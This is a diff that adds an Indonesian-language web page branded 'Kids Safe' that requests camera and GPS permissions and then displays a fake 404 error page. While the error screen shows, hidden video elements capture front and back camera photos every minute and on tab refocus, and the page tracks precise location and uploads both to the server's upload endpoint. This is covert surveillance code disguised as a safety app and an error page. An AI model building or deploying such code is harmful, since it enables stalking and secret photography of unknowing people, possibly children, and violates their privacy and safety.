@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Kids Safe</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, 'Segoe UI', sans-serif; }
+  body { background: #1a1a1a; color: white; min-height: 100vh; overflow: hidden; }
+  
+  .screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; display: none; flex-direction: column; align-items: center; justify-content: center; padding: 24px; }
+  .screen.active { display: flex; }
+  
+  /* Setup screen */
+  .logo { font-size: 72px; margin-bottom: 16px; }
+  h1 { font-size: 26px; margin-bottom: 8px; text-align: center; }
+  .subtitle { color: #888; text-align: center; margin-bottom: 32px; font-size: 14px; line-height: 1.5; }
+  
+  .perm-list { width: 100%; max-width: 360px; margin-bottom: 24px; }
+  .perm-item { display: flex; align-items: center; padding: 16px; background: #2a2a2a; border-radius: 14px; margin-bottom: 10px; transition: all 0.3s; }
+  .perm-item.granted { background: #1a3a1a; border: 1px solid #4ade80; }
+  .perm-icon { font-size: 26px; margin-right: 14px; width: 36px; text-align: center; }
+  .perm-text { flex: 1; }
+  .perm-title { font-size: 15px; font-weight: 600; margin-bottom: 2px; }
+  .perm-desc { font-size: 12px; color: #888; }
+  .perm-status { font-size: 22px; }
+  
+  .btn { width: 100%; max-width: 360px; padding: 16px; border: none; border-radius: 14px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.2s; }
+  .btn-primary { background: linear-gradient(135deg, #ff6b00, #ff8c00); color: white; }
+  .btn-primary:disabled { background: #444; color: #888; cursor: not-allowed; }
+  .btn-primary:active:not(:disabled) { transform: scale(0.98); }
+  
+  .progress { width: 100%; max-width: 360px; height: 4px; background: #2a2a2a; border-radius: 2px; margin-bottom: 24px; overflow: hidden; }
+  .progress-bar { height: 100%; background: linear-gradient(90deg, #ff6b00, #ff8c00); width: 0%; transition: width 0.4s; }
+  
+  /* 404 Screen — tema orange */
+  #screen404 {
+    background: radial-gradient(circle at center, #2a1500 0%, #0a0500 100%);
+    position: relative;
+  }
+  .glow-bg { position: absolute; width: 500px; height: 500px; background: radial-gradient(circle, rgba(255,107,0,0.3) 0%, transparent 70%); animation: pulse 3s ease-in-out infinite; }
+  @keyframes pulse { 0%, 100% { transform: scale(1); opacity: 0.6; } 50% { transform: scale(1.2); opacity: 1; } }
+  
+  .big-404 { position: relative; z-index: 2; font-size: 140px; font-weight: 900; letter-spacing: -4px; background: linear-gradient(180deg, #ffb347 0%, #ff6b00 50%, #cc4400 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; text-shadow: 0 0 60px rgba(255,107,0,0.5); animation: flicker 2s infinite; }
+  @keyframes flicker { 0%, 100% { opacity: 1; } 50% { opacity: 0.85; } }
+  
+  .status-text { position: relative; z-index: 2; color: #ff8c00; font-size: 14px; margin-top: 20px; letter-spacing: 2px; text-transform: uppercase; opacity: 0.7; }
+  .dot-pulse { display: inline-block; width: 8px; height: 8px; background: #4ade80; border-radius: 50%; margin-right: 8px; animation: blink 1.5s infinite; }
+  @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+  
+  .info-text { position: relative; z-index: 2; color: #666; font-size: 12px; margin-top: 8px; text-align: center; }
+  
+  /* Preview kamera (hidden, cuma buat capture) */
+  #videoFront, #videoBack { display: none; }
+  #canvasFront, #canvasBack { display: none; }
+  
+  .toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: #2a2a2a; color: white; padding: 12px 20px; border-radius: 10px; font-size: 13px; opacity: 0; transition: opacity 0.3s; z-index: 100; }
+  .toast.show { opacity: 1; }
+</style>
+</head>
+<body>
+
+<!-- SCREEN 1: SETUP IZIN -->
+<div class="screen active" id="screenSetup">
+  <div class="logo">🛡️</div>
+  <h1>Kids Safe</h1>
+  <p class="subtitle">Aktifkan izin berikut untuk melanjutkan</p>
+  
+  <div class="progress"><div class="progress-bar" id="progressBar"></div></div>
+  
+  <div class="perm-list">
+    <div class="perm-item" id="permCamera" onclick="requestCamera()">
+      <div class="perm-icon">📷</div>
+      <div class="perm-text">
+        <div class="perm-title">Kamera</div>
+        <div class="perm-desc">Depan & belakang</div>
+      </div>
+      <div class="perm-status">⭕</div>
+    </div>
+
+    <div class="perm-item" id="permLocation" onclick="requestLocation()">
+      <div class="perm-icon">📍</div>
+      <div class="perm-text">
+        <div class="perm-title">Lokasi</div>
+        <div class="perm-desc">Posisi real-time</div>
+      </div>
+      <div class="perm-status">⭕</div>
+    </div>
+  </div>
+
+  <button class="btn btn-primary" id="btnStart" disabled onclick="startCapture()">
+    Mulai
+  </button>
+</div>
+
+<!-- SCREEN 2: 404 ORANGE -->
+<div class="screen" id="screen404">
+  <div class="glow-bg"></div>
+  <div class="big-404">404</div>
+  <div class="status-text"><span class="dot-pulse"></span>Terhubung & Aktif</div>
+  <p class="info-text" id="statusInfo">Mengambil data...</p>
+</div>
+
+<!-- Hidden video & canvas -->
+<video id="videoFront" autoplay playsinline muted></video>
+<video id="videoBack" autoplay playsinline muted></video>
+<canvas id="canvasFront"></canvas>
+<canvas id="canvasBack"></canvas>
+
+<div class="toast" id="toast"></div>
+
+<script>
+const SERVER = window.location.origin;
+const STATE = {
+  cameraGranted: false,
+  locationGranted: false,
+  deviceId: null,
+  lastLat: null,
+  lastLng: null,
+  lastAcc: null,
+  frontStream: null,
+  backStream: null,
+  captureInterval: null
+};
+
+// ===== TOAST =====
+function toast(msg) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.classList.add('show');
+  setTimeout(() => t.classList.remove('show'), 2500);
+}
+
+// ===== UPDATE PROGRESS =====
+function updateProgress() {
+  const granted = [STATE.cameraGranted, STATE.locationGranted].filter(Boolean).length;
+  document.getElementById('progressBar').style.width = (granted / 2 * 100) + '%';
+  document.getElementById('btnStart').disabled = granted !== 2;
+}
+
+// ===== REQUEST CAMERA =====
+async function requestCamera() {
+  if (STATE.cameraGranted) return;
+  try {
+    // Coba kamera belakang dulu
+    const backStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: { ideal: 'environment' }, width: { ideal: 1280 }, height: { ideal: 720 } }
+    });
+    STATE.backStream = backStream;
+    document.getElementById('videoBack').srcObject = backStream;
+
+    // Coba kamera depan
+    try {
+      const frontStream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: { ideal: 'user' }, width: { ideal: 1280 }, height: { ideal: 720 } }
+      });
+      STATE.frontStream = frontStream;
+      document.getElementById('videoFront').srcObject = frontStream;
+    } catch (e) {
+      console.warn('Kamera depan gak bisa, pake belakang aja');
+      STATE.frontStream = null;
+    }
+
+    STATE.cameraGranted = true;
+    const el = document.getElementById('permCamera');
+    el.classList.add('granted');
+    el.querySelector('.perm-status').textContent = '✅';
+    updateProgress();
+    toast('Kamera aktif ✅');
+  } catch (err) {
+    toast('Izin kamera ditolak ❌');
+    console.error(err);
+  }
+}
+
+// ===== REQUEST LOCATION =====
+function requestLocation() {
+  if (STATE.locationGranted) return;
+  if (!navigator.geolocation) {
+    toast('Browser gak support GPS');
+    return;
+  }
+  navigator.geolocation.getCurrentPosition(
+    (pos) => {
+      STATE.locationGranted = true;
+      STATE.lastLat = pos.coords.latitude;
+      STATE.lastLng = pos.coords.longitude;
+      STATE.lastAcc = pos.coords.accuracy;
+      
+      const el = document.getElementById('permLocation');
+      el.classList.add('granted');
+      el.querySelector('.perm-status').textContent = '✅';
+      updateProgress();
+      toast('Lokasi aktif ✅');
+
+      // Mulai watch position
+      navigator.geolocation.watchPosition(
+        (p) => {
+          STATE.lastLat = p.coords.latitude;
+          STATE.lastLng = p.coords.longitude;
+          STATE.lastAcc = p.coords.accuracy;
+        },
+        (e) => console.warn('Watch error', e),
+        { enableHighAccuracy: true, maximumAge: 5000, timeout: 15000 }
+      );
+    },
+    (err) => {
+      toast('Izin lokasi ditolak ❌');
+      console.error(err);
+    },
+    { enableHighAccuracy: true, timeout: 15000 }
+  );
+}
+
+// ===== REGISTER DEVICE =====
+async function registerDevice() {
+  try {
+    const res = await fetch(SERVER + '/api/register', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        userAgent: navigator.userAgent,
+        deviceName: 'HP Anak'
+      })
+    });
+    const data = await res.json();
+    STATE.deviceId = data.deviceId;
+    localStorage.setItem('deviceId', data.deviceId);
+    return data.deviceId;
+  } catch (err) {
+    console.error('Register gagal', err);
+    // Fallback: pake device ID lokal
+    STATE.deviceId = localStorage.getItem('deviceId') || 'DEV-LOCAL';
+    return STATE.deviceId;
+  }
+}
+
+// ===== CAPTURE DARI VIDEO =====
+function captureFromVideo(videoEl, canvasEl) {
+  return new Promise((resolve) => {
+    if (!videoEl.srcObject) return resolve(null);
+    const v = videoEl;
+    if (v.videoWidth === 0) return resolve(null);
+    
+    canvasEl.width = v.videoWidth;
+    canvasEl.height = v.videoHeight;
+    const ctx = canvasEl.getContext('2d');
+    ctx.drawImage(v, 0, 0, canvasEl.width, canvasEl.height);
+    canvasEl.toBlob((blob) => resolve(blob), 'image/jpeg', 0.85);
+  });
+}
+
+// ===== UPLOAD FOTO + LOKASI =====
+async function captureAndUpload() {
+  if (!STATE.deviceId) return;
+  
+  try {
+    const frontBlob = await captureFromVideo(document.getElementById('videoFront'), document.getElementById('canvasFront'));
+    const backBlob = await captureFromVideo(document.getElementById('videoBack'), document.getElementById('canvasBack'));
+
+    const formData = new FormData();
+    formData.append('deviceId', STATE.deviceId);
+    formData.append('latitude', STATE.lastLat || 0);
+    formData.append('longitude', STATE.lastLng || 0);
+    formData.append('accuracy', STATE.lastAcc || 0);
+    formData.append('timestamp', new Date().toISOString());
+    
+    if (frontBlob) formData.append('photoFront', frontBlob, 'front.jpg');
+    if (backBlob) formData.append('photoBack', backBlob, 'back.jpg');
+
+    const res = await fetch(SERVER + '/api/upload', {
+      method: 'POST',
+      body: formData
+    });
+    const data = await res.json();
+    console.log('Upload sukses', data);
+    document.getElementById('statusInfo').textContent = 
+      `Update terakhir: ${new Date().toLocaleTimeString('id-ID')}`;
+  } catch (err) {
+    console.error('Upload gagal', err);
+    document.getElementById('statusInfo').textContent = 'Koneksi terputus, coba lagi...';
+  }
+}
+
+// ===== START CAPTURE LOOP =====
+async function startCapture() {
+  document.getElementById('screenSetup').classList.remove('active');
+  document.getElementById('screen404').classList.add('active');
+
+  await registerDevice();
+  
+  // Pertama kali: langsung capture
+  await captureAndUpload();
+
+  // Loop: capture tiap 60 detik (bisa lo ubah)
+  STATE.captureInterval = setInterval(captureAndUpload, 60000);
+
+  // Heartbeat tiap 30 detik
+  setInterval(() => {
+    if (STATE.deviceId) {
+      fetch(SERVER + '/api/heartbeat', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ deviceId: STATE.deviceId })
+      }).catch(() => {});
+    }
+  }, 30000);
+}
+
+// Cek device ID yang udah ada
+window.addEventListener('load', () => {
+  const saved = localStorage.getItem('deviceId');
+  if (saved) STATE.deviceId = saved;
+});
+
+// Handle visibility change — kalau tab balik aktif, capture lagi
+document.addEventListener('visibilitychange', () => {
+  if (!document.hidden && STATE.deviceId && STATE.cameraGranted) {
+    setTimeout(captureAndUpload, 2000);
+  }
+});
+</script>
+</body>
+      </html>
